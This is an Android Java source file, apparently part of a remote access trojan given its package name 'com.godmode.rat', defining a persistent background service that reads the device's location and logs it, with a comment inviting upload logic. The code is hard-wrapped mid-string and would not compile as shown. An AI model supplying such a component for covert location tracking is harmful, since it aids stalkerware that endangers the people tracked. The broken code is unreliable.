# (Paste the code below, then press Ctrl+O to save and Ctrl+X to exit)
package com.godmode.rat; import 
android.app.Service; import 
android.content.Intent; import 
android.location.Location; import 
android.os.IBinder; import 
android.util.Log; import 
androidx.annotation.Nullable; import 
com.google.android.gms.location.FusedLocationProviderClient; 
import 
com.google.android.gms.location.LocationServices; 
import java.text.SimpleDateFormat; 
import java.util.Date; import 
java.util.Locale; public class 
LocationService extends Service {
    private static final String TAG 
    = "LocationService"; private 
    FusedLocationProviderClient 
    fusedLocationClient; private 
    boolean isRunning = false; 
    @Override public void onCreate() 
    {
        super.onCreate(); 
        fusedLocationClient = 
        LocationServices.getFusedLocationProviderClient(this); 
        Log.d(TAG, "LocationService 
        created");
    }
    @Override public int 
    onStartCommand(Intent intent, 
    int flags, int startId) {
        if (!isRunning) { isRunning 
            = true; getLocation();
        }
        return START_STICKY;
    }
    private void getLocation() { try 
        {
            fusedLocationClient.getLastLocation() 
                    .addOnSuccessListener(this, 
                    location -> {
                        if (location 
                        != null) {
                            double 
                            latitude 
                            = 
                            location.getLatitude(); 
                            double 
                            longitude 
                            = 
                            location.getLongitude(); 
                            String 
                            timestamp 
                            = new 
                            SimpleDateFormat("yyyy-MM-dd 
                            HH:mm:ss", 
                            Locale.getDefault()).format(new 
                            Date());
                            
                            // Log 
                            // the 
                            // data 
                            // (you 
                            // can 
                            // replace 
                            // this 
                            // with 
                            // your 
                            // upload 
                            // logic)
                            Log.d(TAG, 
                            "Lat: " 
                            + 
                            latitude 
                            + ", 
                            Lng: " + 
                            longitude 
                            + ", 
                            Time: " 
                            + 
                            timestamp);
                            
                            // Stop 
                            // service 
                            // after 
                            // one 
                            // fetch 
                            // if 
                            // you 
                            // only 
                            // want 
                            // a 
                            // single 
                            // point 
                            // stopSelf();
                        } else {
                            Log.d(TAG, 
                            "Location 
                            is 
                            null");
                        }
                    });
        } catch (Exception e) {
            Log.e(TAG, "Error 
            getting location", e);
        }
    }
    @Nullable @Override public 
    IBinder onBind(Intent intent) {
        return null;
    }
}

